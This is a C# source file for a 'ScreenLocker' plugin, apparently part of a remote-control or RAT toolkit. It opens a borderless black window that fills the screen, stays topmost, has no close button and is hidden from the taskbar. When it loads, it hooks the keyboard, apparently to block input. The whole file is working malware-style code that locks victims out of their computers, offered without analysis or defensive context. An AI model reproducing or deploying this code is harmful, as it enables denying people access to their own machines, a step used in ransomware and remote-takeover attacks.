using System;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    class ScreenLocker : Form
    {
        public ScreenLocker(string name) 
        {
            this.Name = name;
			this.Text = name;
			this.Load += new EventHandler(Form1_Load);
        }

		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && components != null)
				{
					components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		private System.ComponentModel.IContainer components;

		[System.Diagnostics.DebuggerStepThrough()]
		public void InitializeComponent()
		{
			this.SuspendLayout();
			this.AutoScaleDimensions = new System.Drawing.SizeF(6.0F, 13.0F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.Black;
			this.ClientSize = new System.Drawing.Size(800, 450);
			this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.ResumeLayout(false);
		}

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams cp = base.CreateParams;
				const int CS_NOCLOSE = 0x200;
				cp.ClassStyle |= CS_NOCLOSE;
				return cp;
			}
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			this.WindowState = FormWindowState.Maximized;
			NativeAPI.Miscellaneous.SetWindowPos(this.Handle, (IntPtr)NativeAPI.Miscellaneous.HWND_TOPMOST, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, NativeAPI.Miscellaneous.SWP_NOMOVE | NativeAPI.Miscellaneous.SWP_NOSIZE | NativeAPI.Miscellaneous.SWP_NOREDRAW | NativeAPI.Miscellaneous.SWP_DEFERERASE);
			Functions.SetAero10(this.Handle);
			NativeAPI.Hook.KeyBoardHooking hook = new NativeAPI.Hook.KeyBoardHooking();
			hook.HookKeyboard();
		}
	}
}
